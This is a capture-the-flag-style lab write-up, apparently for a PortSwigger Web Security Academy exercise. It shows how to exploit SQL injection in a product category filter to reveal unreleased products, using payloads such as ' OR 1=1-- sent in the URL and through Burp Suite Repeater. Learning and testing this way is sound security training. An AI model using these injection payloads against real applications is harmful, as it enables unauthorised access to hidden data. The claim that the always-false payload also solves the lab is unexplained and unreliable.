<h1 align="center"> Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data </h1>

<img width="1050" height="559" alt="image" src="https://github.com/user-attachments/assets/0891f225-f42f-452e-b26c-72f4ca28260a" />

## Lab Requirement:
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: 
````
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````
 To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 


## Start Lab:
<img width="1050" height="559" alt="image" src="https://github.com/user-attachments/assets/0891f225-f42f-452e-b26c-72f4ca28260a" />


- Access the Lab:
<img width="1320" height="937" alt="image" src="https://github.com/user-attachments/assets/cf3926e5-a46b-4391-b754-6564a76d5057" />


## Without Burp Suite:

- After click `Pets`:
<img width="1238" height="853" alt="image" src="https://github.com/user-attachments/assets/1aa288a5-1df1-42ba-b6de-15e8cf39a7af" />

<img width="1234" height="966" alt="image" src="https://github.com/user-attachments/assets/1a525970-d0e3-49f5-ba43-b9c9d526a8d1" />

- This means the app is likely running a SQL query like:
````
SELECT * FROM products WHERE category = 'Pets' AND released = 1
````

In this if I add `'` After `Pets`:
<img width="985" height="337" alt="image" src="https://github.com/user-attachments/assets/916d239f-8318-4601-8490-b4e4934f8b7b" />

- Now we see `Internal Server Error`.
- This means the app is likely running a SQL query like:
````
SELECT * FROM products WHERE category = 'Pets'' AND released = 1
````


### Bypass the WHERE Clause with Logic
- We want to make the WHERE clause always true → so it returns all products, including hidden ones.
- In this we can use payload:
````
' OR 1=1--
````
````
0a1e009b04f5f48586ad8581002f0059.web-security-academy.net/filter?category=Pets' OR 1=1--
````
<img width="974" height="112" alt="image" src="https://github.com/user-attachments/assets/d06a1d26-0e89-4456-bffe-d0d362e70567" />

<img width="1280" height="1011" alt="image" src="https://github.com/user-attachments/assets/9f19cf30-c656-485c-9870-7f38be6ce0ea" />

- Now we see we get successful to solve this lab.

### Why this work:
Original query:
````
SELECT * FROM products WHERE category = 'Pets';
````
After injection:
````
SELECT * FROM products WHERE category = 'Pets' OR 1=1-- ';
````
- `'Pets' OR 1=1`: always TRUE
- `--`: comments out the rest of the query (so no syntax error)
Result: All rows are returned, including hidden products!

- OR we can use others payload:
````
' AND 1=2--
````
````
https://0a1e009b04f5f48586ad8581002f0059.web-security-academy.net/filter?category=Pets%27%20AND%201=2--
````
<img width="978" height="107" alt="image" src="https://github.com/user-attachments/assets/7cae7b21-4438-4ddd-8eca-35e3c56b0bd5" />

<img width="1245" height="666" alt="image" src="https://github.com/user-attachments/assets/6563ab21-c92e-40fa-9be2-3da9a0653b55" />

- `Always false → show nothing`
- Now we see we got success like above.


- Now we got successful to solve this lab.


---



## With Burp Suite:
First open our `Burp Suite` -> Open `Burp Browser`:
<img width="1918" height="947" alt="image" src="https://github.com/user-attachments/assets/42c08acb-6b48-452a-8b99-27c43241af4d" />

- After `Past` the target URL to it:
<img width="1685" height="371" alt="image" src="https://github.com/user-attachments/assets/8854df53-f32b-466c-b011-b59a163efbad" />

- After go back to our `Burp Suite` -> back to `Target` -> `Site Map` -> after `Right-Click` our what we want add to scope -> `Add to scope`:
<img width="1910" height="1043" alt="image" src="https://github.com/user-attachments/assets/8e16d596-6f26-4ef9-b400-6586f708a95f" />

<img width="560" height="227" alt="image" src="https://github.com/user-attachments/assets/1a91da71-3b7a-46d0-8b80-f49365415e4b" />

- `Click` on number `1` -> `Show only in-scope item` -> `Apply & close`:
<img width="1891" height="980" alt="image" src="https://github.com/user-attachments/assets/330b2512-7924-49f4-a5a6-54ca505faa2e" />

After we see:
<img width="1902" height="981" alt="image" src="https://github.com/user-attachments/assets/53d58ead-5729-43e1-875a-80684b01a133" />


- Go back to our `Burp Suite Browser`:
<img width="1455" height="961" alt="image" src="https://github.com/user-attachments/assets/9a75ed11-4553-4333-95e8-8f9df3b909af" />

- After go back to our `Burp Suite`:
<img width="1901" height="1006" alt="image" src="https://github.com/user-attachments/assets/09097336-3af3-4927-a6ea-4e45bf4f2158" />

- After `Right-Click` on `GET categor=Gifts` -> `Send to Repeater` -> after go to `Repeater`:
<img width="1475" height="982" alt="image" src="https://github.com/user-attachments/assets/895b3ac8-1783-4794-a3c0-878610de3c26" />

<img width="1471" height="846" alt="image" src="https://github.com/user-attachments/assets/0aa39b65-5913-489e-985f-fe3740064d20" />

Select on `Gifts`
````
Gifts' OR 1=1 --
````
<img width="1865" height="893" alt="image" src="https://github.com/user-attachments/assets/14336951-2d2b-4b51-b4d2-41d6e9a9f70e" />

<img width="1902" height="908" alt="image" src="https://github.com/user-attachments/assets/48e3f4c0-7b2a-4dd0-9087-bd0433581199" />

- After go back to `Burp Suite Browser`:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/7b881942-bb42-4010-ad98-2608f320058b" />


Now we got successful to solve this lab.


----


<h2 align="center"> Finished of Vuln In WHERE cluase </h2>


<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>


<h3 align="center"> Date: 25/12/2025 </h3>

